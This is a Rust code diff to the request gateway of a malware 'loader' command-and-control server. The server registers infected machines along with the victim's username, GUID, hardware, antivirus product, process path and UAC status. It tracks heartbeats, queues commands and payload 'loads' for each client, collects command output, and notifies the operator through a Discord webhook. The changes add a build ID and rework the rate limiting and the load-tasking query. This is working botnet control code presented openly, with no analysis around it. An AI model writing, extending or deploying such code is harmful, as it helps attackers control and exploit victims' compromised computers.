@@ -25,6 +25,7 @@ pub async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
     const CLIENT_ID_LENGTH: usize = 16;
 
     let connection_interval = *CONNECTION_INTERVAL.read().unwrap();
+    let connection_interval_buffer = *CONNECTION_INTERVAL_BUFFER.read().unwrap();
     let enable_firewall = *ENABLE_FIREWALL.read().unwrap();
 
     let mut connection: Conn = obtain_connection().await;
@@ -36,10 +37,6 @@ pub async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
     }
 
     let split_body: Vec<&str> = req_body.split(".").collect(); // 0 will always be non-json, either AES key or Client bytes. 1 will either be nothing or json.
-    // Modfiy server to generate a "next" byte sequence and store it in the client DB for that client id.
-    // If the encrypted message doesn't contain this "next" byte sequence, or the "next" byte sequence is incorrect,
-    // the request is being replayed. Block that client forever.
-
          
     match split_body.len() {
         HANDSHAKE_P2 => {
@@ -47,12 +44,6 @@ pub async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
             if split_body[0].len() == CLIENT_ID_LENGTH && is_client(&mut connection, split_body[0]).await {
                 let client_id = split_body[0];
 
-                // Fix. Will literally never go through if the firewall is on.
-                // return last_seen.unwrap() + connection_interval + 10 > get_timestamp()
-                if enable_firewall && get_last_seen(&mut connection, client_id).await - get_timestamp() < connection_interval {
-                    block_client(&mut connection, &client_id, "Sending too many requests as a registered client.", &ip, 1200).await;
-                    return resp_unauthorised();
-                }
 
                 if is_client_blocked(&mut connection, client_id, &ip).await {
                     fprint("restricted", &format!("({}) {} tried doing an action while blocked.", &ip, &client_id));
@@ -91,6 +82,12 @@ pub async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
 
                 match key_to_string(&submitted_json, "action").as_str() {
                     "heartbeat" => {
+                        
+                        if (get_timestamp() - get_last_seen(&mut connection, client_id).await) + connection_interval_buffer < connection_interval {
+                            block_client(&mut connection, &client_id, "Sending heartbeats too frequently.", &ip, 1200).await;
+                            return resp_unauthorised();
+                        }
+
                         update_last_seen(&mut connection, &client_id).await;
                         match get_current_client_command(&mut connection, &client_id).await {
 
@@ -169,7 +166,6 @@ pub async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                                         }
                                     
                                         fprint("info", &format!("({}) {} completed command {} with type {}.", &ip, &client_id, &command_id, &cmd_type));
-                                        update_last_seen(&mut connection, &client_id).await;        
                             
                                         return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes()).await;
                                     },
@@ -241,14 +237,14 @@ pub async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                         };
 
                         if !all_keys_valid(&client_data_json, 
-                            vec!["version", "uac", "username", "guid", "cpu", "gpu", "ram", "antivirus", "path", "pid"],
-                            vec!["u64", "bool", "String", "String", "String", "String", "u64", "String", "String", "u64"]
+                            vec!["version", "uac", "username", "guid", "cpu", "gpu", "ram", "antivirus", "path", "pid", "build_id"],
+                            vec!["u64", "bool", "String", "String", "String", "String", "u64", "String", "String", "u64", "String"]
                         ) {
-                            block_client(&mut connection, "N/A", "Missing one or more JSON keys.", &ip, 1200).await;
+                            block_client(&mut connection, "N/A", "Missing one or more JSON keys.", &ip, 0).await;
                             return resp_badrequest();
                         }
 
-                        let client_id = String::from(&sha256::digest(format!("{}{}{}", 
+                        let client_id: String = String::from(&sha256::digest(format!("{}{}{}", 
                             key_to_string(&client_data_json, "guid"), 
                             key_to_string(&client_data_json, "username"),
                             &*API_SECRET.read().unwrap()
@@ -263,7 +259,7 @@ pub async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                                     gpu, ram, antivirus, 
                                     path, pid, last_seen, 
                                     first_seen, encryption_key,
-                                    key_expiration
+                                    key_expiration, build_id
                                 ) 
                                 
                                 VALUES (
@@ -273,7 +269,7 @@ pub async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                                     :gpu, :ram, :antivirus,
                                     :path, :pid, :last_seen,
                                     :first_seen, :encryption_key,
-                                    :key_expiration
+                                    :key_expiration, :build_id
                                 )",
                                 params! {
                                     "client_id" => &client_id,
@@ -292,7 +288,8 @@ pub async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                                     "last_seen" => get_timestamp(),
                                     "first_seen" => get_timestamp(),
                                     "encryption_key" => &provided_encryption_key,
-                                    "key_expiration" => get_timestamp() + connection_interval + 10
+                                    "key_expiration" => get_timestamp() + connection_interval + connection_interval_buffer,
+                                    "build_id" => key_to_string(&client_data_json, "build_id"),
                                 }
                             ).await {
                                 Ok(_) => {
@@ -318,113 +315,106 @@ pub async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                                         client_id.yellow(), 
                                         key_to_string(&client_data_json, "username").yellow()
                                     )));
-
-                                    let load_ids = connection.query_map(r"
-                                    SELECT load_id, cmd_args, cmd_type, is_recursive FROM loads
-                                    ", |row: Row| {
-                                        (value_to_str(&row, 0), value_to_str(&row, 1), value_to_str(&row, 2), value_to_str(&row, 3))
-                                    }).await;
-                        
-                                    match load_ids {
-                                        Ok(_) => (),
-                                        Err(_) => {
-                                            fprint("error", "Unable to fetch load ids.");
-                                        }
-                                    };
-                                    
-                                    for result in load_ids.unwrap() {
-                                        if is_uncompleted_load(&mut connection, &client_id, &result.0).await {
-                                            increment_load(&mut connection, &result.0, 1).await;
-                                            task_client(&mut connection, &client_id, &result.0, &result.1, &result.2).await;
-                                        }   
-                                    }
-
-                                    return resp_ok_encrypted(&client_id, provided_encryption_key.as_bytes()).await;
                                 },
                                 Err(e) =>  {
                                     fprint("error", &format!("Unable to insert new client data into db: {}",e));
                                     return resp_servererror();
                                 }
                             };
-                        }
-
-                        if !is_client_online(&mut connection, &client_id).await {
-                            match connection.exec_drop(
-                                r"UPDATE clients SET uac = :uac, ip = :ip, country = :country, cpu = :cpu, gpu = :gpu, ram = :ram, antivirus = :antivirus, path = :path, pid = :pid, last_seen = :last_seen, encryption_key = :encryption_key, key_expiration = :key_expiration WHERE client_id = :client_id",
-                                params! {
-                                    "uac" => key_to_bool(&client_data_json, "uac"),
-                                    "ip" => &ip,
-                                    "country" => ip_to_country(&ip).await,
-                                    "cpu" => key_to_string(&client_data_json, "cpu"),
-                                    "gpu" => key_to_string(&client_data_json, "gpu"),
-                                    "ram" => key_to_u64(&client_data_json, "ram"),
-                                    "antivirus" => key_to_string(&client_data_json, "antivirus"),
-                                    "path" => key_to_string(&client_data_json, "path"),
-                                    "pid" => key_to_u64(&client_data_json, "pid"),
-                                    "last_seen" => get_timestamp(),
-                                    "client_id" => &client_id,
-                                    "encryption_key" => &provided_encryption_key,
-                                    "key_expiration" => get_timestamp() + connection_interval
-                                }
-                            ).await {
-                                Ok(_) => {
-
-                                    if *NOTIFICATION_ON_CLIENT_RECONNECTION.read().unwrap() {
-                                        discord_webhook_push(
-                                            "🤝 An old client has reconnected with your loader.",
-                                            &format!("```ansi\n[2;36mID:[0m {}\n[2;36mIP:[0m {}\n[2;36mUsername:[0m {}\n[2;36mCPU:[0m {}\n[2;36mGPU:[0m {}\n```",
-                                                &client_id,
-                                                &ip,
-                                                key_to_string(&client_data_json, "username"),
-                                                key_to_string(&client_data_json, "cpu"),
-                                                key_to_string(&client_data_json, "gpu")
-                                            ),
-                                            0xffd700,
-                                            false
-                                        ).await
-                                    }
-
-                                    fprint("success", &format!("{}", 
-                                        format!("({}) {} with username {} reconnected.", 
-                                        &ip.yellow(),  
-                                        client_id.yellow(), 
-                                        key_to_string(&client_data_json, "username").yellow()
-                                    )));
-
-                                    let load_ids = connection.query_map(r"
-                                    SELECT load_id, cmd_args, cmd_type, is_recursive FROM loads
-                                    ", |row: Row| {
-                                        (value_to_str(&row, 0), value_to_str(&row, 1), value_to_str(&row, 2), value_to_str(&row, 3))
-                                    }).await;
-                        
-                                    match load_ids {
-                                        Ok(_) => (),
-                                        Err(_) => {
-                                            fprint("error", "Unable to fetch load ids.");
-                                        }
-                                    };
-                                    
-                                    for result in load_ids.unwrap() {
-                                        if is_uncompleted_load(&mut connection, &client_id, &result.0).await {
-                                            increment_load(&mut connection, &result.0, 1).await;
-                                            task_client(&mut connection, &client_id, &result.0, &result.1, &result.2).await;
-                                        }   
-                                    }
-
-                                    update_last_seen(&mut connection, &client_id).await;        
-                                    return resp_ok_encrypted(&client_id, provided_encryption_key.as_bytes()).await;
-                                },
-                                Err(e) => {
-                                    fprint("error", &format!("Unable to update client data: {}", e));
-                                    return resp_servererror();
-                                }
-                            };
-        
                         } else {
-                            block_client(&mut connection, &client_id, "Re-registering too quickly.", &ip, 1200).await;
-                            return resp_servererror();
+                            if !is_client_online(&mut connection, &client_id).await {
+                                match connection.exec_drop(
+                                    r"UPDATE clients SET 
+                                    uac = :uac, ip = :ip, country = :country, cpu = :cpu, gpu = :gpu, ram = :ram, 
+                                    antivirus = :antivirus, path = :path, pid = :pid, last_seen = :last_seen, 
+                                    encryption_key = :encryption_key, key_expiration = :key_expiration, build_id = :build_id
+                                    WHERE client_id = :client_id",
+                                    params! {
+                                        "uac" => key_to_bool(&client_data_json, "uac"),
+                                        "ip" => &ip,
+                                        "country" => ip_to_country(&ip).await,
+                                        "cpu" => key_to_string(&client_data_json, "cpu"),
+                                        "gpu" => key_to_string(&client_data_json, "gpu"),
+                                        "ram" => key_to_u64(&client_data_json, "ram"),
+                                        "antivirus" => key_to_string(&client_data_json, "antivirus"),
+                                        "path" => key_to_string(&client_data_json, "path"),
+                                        "pid" => key_to_u64(&client_data_json, "pid"),
+                                        "last_seen" => get_timestamp(),
+                                        "client_id" => &client_id,
+                                        "encryption_key" => &provided_encryption_key,
+                                        "key_expiration" => get_timestamp() + connection_interval,
+                                        "build_id" => key_to_string(&client_data_json, "build_id")
+                                    }
+                                ).await {
+                                    Ok(_) => {
+
+                                        if *NOTIFICATION_ON_CLIENT_RECONNECTION.read().unwrap() {
+                                            discord_webhook_push(
+                                                "🤝 An old client has reconnected with your loader.",
+                                                &format!("```ansi\n[2;36mID:[0m {}\n[2;36mIP:[0m {}\n[2;36mUsername:[0m {}\n[2;36mCPU:[0m {}\n[2;36mGPU:[0m {}\n```",
+                                                    &client_id,
+                                                    &ip,
+                                                    key_to_string(&client_data_json, "username"),
+                                                    key_to_string(&client_data_json, "cpu"),
+                                                    key_to_string(&client_data_json, "gpu")
+                                                ),
+                                                0xffd700,
+                                                false
+                                            ).await
+                                        }
+
+                                        fprint("success", &format!("{}", 
+                                            format!("({}) {} with username {} reconnected.", 
+                                            &ip.yellow(),  
+                                            client_id.yellow(), 
+                                            key_to_string(&client_data_json, "username").yellow()
+                                        )));
+
+                                    },
+                                    Err(e) => {
+                                        fprint("error", &format!("Unable to update client data: {}", e));
+                                        return resp_servererror();
+                                    }
+                                };
+            
+                            } else {
+                                block_client(&mut connection, &client_id, "Re-registering too quickly.", &ip, 1200).await;
+                                return resp_servererror();
+                            }
+                        }
+                        
+                        let load_ids = connection.exec_map(r"
+                            SELECT load_id, cmd_args, cmd_type 
+                            FROM loads 
+                            WHERE (is_recursive = 1 
+                            OR (
+                                load_id NOT IN (
+                                    SELECT load_id FROM outputs WHERE client_id = :client_id
+                                ) 
+                                AND required_amount!= completed_amount
+                            ))
+                        
+                        
+                        ", params! {
+                            "client_id" => &client_id,
+                        }, |row: Row| {
+                            (value_to_str(&row, 0), value_to_str(&row, 1), value_to_str(&row, 2))
+                        }).await;
+            
+                        match load_ids {
+                            Ok(_) => (),
+                            Err(ref error) => {
+                                fprint("error", &format!("Unable to fetch load ids: {}", error));
+                            }
+                        };
+                        
+                        for result in load_ids.unwrap() {
+                            increment_load(&mut connection, &result.0, 1).await;
+                            task_client(&mut connection, &client_id, &result.0, &result.1, &result.2).await;
                         }
 
+                        update_last_seen(&mut connection, &client_id).await;
+                        return resp_ok_encrypted(&client_id, provided_encryption_key.as_bytes()).await;
                     };                            
                 }
             }
